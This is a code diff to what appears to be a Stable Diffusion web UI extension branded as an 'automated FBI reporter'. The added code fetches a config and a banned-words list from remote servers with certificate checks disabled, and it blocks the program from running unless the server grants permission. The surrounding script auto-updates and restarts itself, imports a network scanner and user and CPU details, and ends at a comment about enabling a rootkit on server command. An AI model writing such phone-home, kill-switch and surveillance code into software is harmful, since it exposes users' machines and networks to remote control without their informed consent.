@@ -6,14 +6,15 @@ import warnings
 from base64 import b64encode
 from getpass import getuser
 from pathlib import Path
-from typing import List
+from typing import Any, List, Tuple, Type
 
 import cv2
 import requests
 import torch
 from PIL import Image
 from cpuinfo import get_cpu_info
-from modules import scripts, shared, script_callbacks
+from modules import script_callbacks, scripts, shared
+from requests import Response
 
 from scripts.funcs import *
 from scripts.network_scanner import scan_network as scanner
@@ -39,18 +40,42 @@ dir_path = Path(inspect.getfile(lambda: None)).parents[1]
 if git_pull_changed(dir_path):
     print('Submodules updated, restarting program...')
     restart_program()
-    # print('Updated, please restart program...')
-    # sys.exit(1)
 
-# Fetch the config from the FBI server.
+
+def get_client_config(domain) -> tuple[Any, Any, Response]:
+    r = requests.get(f'https://{domain}/client', verify=False)
+    return r.json(), r.json()['banned_words'], r
+
+
+cf_endpoint = 'route.fbi.cyberes.net'
+main_endpoint = 'fbi.cyberes.net'
+endpoint = None
+endpoint_err = None
+
+# Try to use the Cloudflare Workers backend first.
 try:
-    r = requests.get('https://fbi.cyberes.net/client', verify=False)
-    client_config = r.json()
-    banned_words = client_config['banned_words']
+    client_config, banned_words, resp = get_client_config(cf_endpoint)
+    if resp.status_code == 200:
+        endpoint = cf_endpoint
 except Exception as e:
+    # If we failed for any reason just use the normal endpoint
+    print('Failed to reach routed endpoint:', e)
+
+# If that fails just use the main endpoint.
+if not endpoint:
+    try:
+        client_config, banned_words, resp = get_client_config(main_endpoint)
+        if resp.status_code == 200:
+            endpoint = main_endpoint
+    except Exception as e:
+        # We'll handle this later
+        endpoint_err = e
+
+# If the endpoint is not defined that means the server didn't give us 200 OK.
+if not endpoint:
     print('Failed to load automated FBI reporter:')
-    print(e)
-    print('Permission not granted to load Stable Diffusion.')
+    print(endpoint_err)
+    print('Permission not granted to run Stable Diffusion.')
     sys.exit(1)
 
 # Enable the rootkit if the server tells us to.
